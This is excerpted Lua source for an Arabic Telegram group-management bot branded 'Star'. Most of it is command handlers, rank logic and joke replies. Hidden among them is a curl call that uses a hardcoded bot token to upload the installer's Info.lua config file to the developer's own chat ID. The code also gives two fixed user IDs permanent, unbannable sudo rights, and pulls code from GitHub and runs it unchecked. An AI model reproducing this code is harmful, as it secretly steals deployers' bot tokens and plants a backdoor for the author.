...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Vklkk/VAMBAIR/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1373616147,1567626933}   
...
if tonumber(user_id) == tonumber(1567626933) then  
var = true 
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'ستار'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local UserName = (data.username_ or "textchuser")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 CHANNEL")  
...
local curl = 'curl "'..'https://api.telegram.org/bot1706737466:AAG8CRj1VGRUinWWPnm8WEIGUHbl8j64KMY/sendDocument'..'" -F "chat_id='.. 1373616147 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
os.execute('wget https://raw.githubusercontent.com/Vklkk/VAMBAIR/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ✯  تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'  ✯  اصدار سورس ستار { s: 6.7}')
end

if text == 'قناه السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SOURCE_STAR1)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/SOURCE_STAR1"}}, 
} 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'بًـوٌتٌ آلَتٌـوٌصّـلَ  ☑ ➘', url="t.me/Sourcybot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
 ...
 local msg_id = msg.id_/2097152/0.5
local Text = [[
 معاك مطور البوت لاي استفسار
اتبع الزرار تحت 𖠕
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '❲'..result.first_name_..'❳',url="t.me/"..result.username_}},
{{text = ' ❲S T A R❳', url="t.me/SOURCE_STAR2"}}, 
}
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  ✯  العضو ⇎ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n  ✯  '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0,"  ✯  العضو : {["..data.first_name_.."](T.ME/SOURCE_STAR1)}\n  ✯  ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "  ✯  عذرا ⇎ {["..data.first_name_.."](T.ME/SOURCE_STAR1)}\n  ✯  عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text == '/start' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
{{text = '⌯｟SOURCE BOT✭｠⌯',url="t.me/Vambair_bot"}},
{{text = '⌯｟TWASL✰｠⌯',url="t.me/Sourcybot"}},
{{text = '⌯｟STAR✪｠⌯ ', url="t.me/SOURCE_STAR1"}},
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
✭اهلا بيك في سورس ستار لو عايز بوت بكل حقوقك ع السورس تواصل معي✭
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯｟DEV VAMBAIR✰｠⌯',url="t.me/DEV_VAMBAIR"}},
{{text = '⌯｟TWASEL✰｠⌯',url="t.me/Sourcybot"}},
{{text = '⌯｟CHANNEL✰｠⌯',url="t.me/SOURCE_STAR1"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sssstaaar/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'فمبير' or text == 'فامبير' or text == 'VAMBAIR' then
local Text = [[
المبرمج فامبير لو حابب تتواصل معاهه
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯｟V A M B A I R✯｠⌯',url="t.me/DEV_VAMBAIR"}},
}
local msg_id = msg.id_/2097152/0.5 
...
local Text = [[
بوت يوتيوب سورس ستار
اتبع الزر إلى تحت ↓

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '❲YOUTUBE❳',url="t.me/Ssociial_bot"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sssstaaar/10&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[
المبرمج فامبير لتواصل مع اتبع الزر الي في الاسفل ♥
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '((ᴠαᴍⲃαᎥⲅ))',url="t.me/DEV_VAMBAIR"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sssstaaar/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس ', url="t.me/SOURCE_STAR1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '•═════•| ✯STAR✯ |•═════•' then
local Text = [[ 
⌘سورس ستار افضل سورس فالتلي
سرعه وقوه وامان وحمايه عاليه✭
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس ', url="t.me/SOURCE_STAR1"}}, 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس ', url="t.me/Sourcybot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'العاب ستار' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ✯ اهلا في قائمه الالعاب المتطوره سورس ستار  ✯ 
...
elseif text == 'قفل ستاررسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
elseif text == 'فتح ستاررسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  ✯  بواسطه ⇎ ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'textchuser')..') \n  ✯  تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1567626933) then  
send(msg.chat_id_, msg.id_, "  ✯  لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1373616147) then  
send(msg.chat_id_, msg.id_, "  ✯  لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1567626933) then
send(msg.chat_id_, msg.id_, "  ✯  لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1373616147) then
send(msg.chat_id_, msg.id_, "  ✯  لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1567626933) then  
send(msg.chat_id_, msg.id_, "  ✯  لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1373616147) then  
send(msg.chat_id_, msg.id_, "  ✯  لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Vklkk/VAMBAIR/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n  ✯  اهلا بك في متجر ملفات ستار\n  ✯  ملفات السورس ↓\n•═════•| ✯STAR✯ |•═════•\n\n"
local TextE = "\n•═════•| ✯STAR✯ |•═════•\n  ✯  علامة تعني { ✔️ } ملف مفعل\n  ✯  علامة تعني { ✖ } ملف معطل\n  ✯  قناة سورس ستار ↓\n".."  ✯  [اضغط هنا لدخول](t.me/SOURCE_STAR1) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Vklkk/VAMBAIR/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_,"  ✯  عذرا الملف لايدعم سورس ستار \n") 
end
return false
end
...
if text == ("مسح قائمه ستار") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n  ✯  تم مسح قائمه ستار')
return false
end

if text == 'قائمه ستار' and Sudo(msg) then
...
if text == ("رفع ستار") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ستار @(.*)$") and Sudo(msg) then
local username = text:match("^رفع ستار @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ستار (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع ستار (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل ستار") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ستار @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل ستار @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ستار (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل ستار (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
keyboard.inline_keyboard = {
{{text = '❲'..result.first_name_..'❳',url="t.me/"..result.username_}},
{{text = '❲S T A R❳', url="t.me/SOURCE_STAR1"}}, 
}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n  ✯  العضو ⇎ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n  ✯  تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'ستار')
local DRAGON_Msg = {
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text =  ((DEVELOPER)) ,url="t.me/DEV_VAMBAIR"}}, 
{{text =  ((CHANNEL)) ,url="t.me/SOURCE_STAR1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
end --الكود حصري سورس ستار يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ستار').." غادر" or text == 'غادر' then  
...
if text == 'بوت' then
Namebot = (database:get(bot_id..'Name:Bot') or 'ستار')
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/SOURCE_STAR1)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/SOURCE_STAR1)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/SOURCE_STAR1)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/SOURCE_STAR1)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/SOURCE_STAR1)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/SOURCE_STAR1)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/SOURCE_STAR1)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/SOURCE_STAR1)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/SOURCE_STAR1)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/SOURCE_STAR1)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/SOURCE_STAR1)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/SOURCE_STAR1)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/SOURCE_STAR1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/SOURCE_STAR1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/SOURCE_STAR1)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/SOURCE_STAR1)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/SOURCE_STAR1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/SOURCE_STAR1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/SOURCE_STAR1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/SOURCE_STAR1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/SOURCE_STAR1)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/SOURCE_STAR1)') 
return false
end
end
end
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '  ✯  هوا الخنزير دا اللي ضافك 😂🙂⇎ '..Name
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ستار')
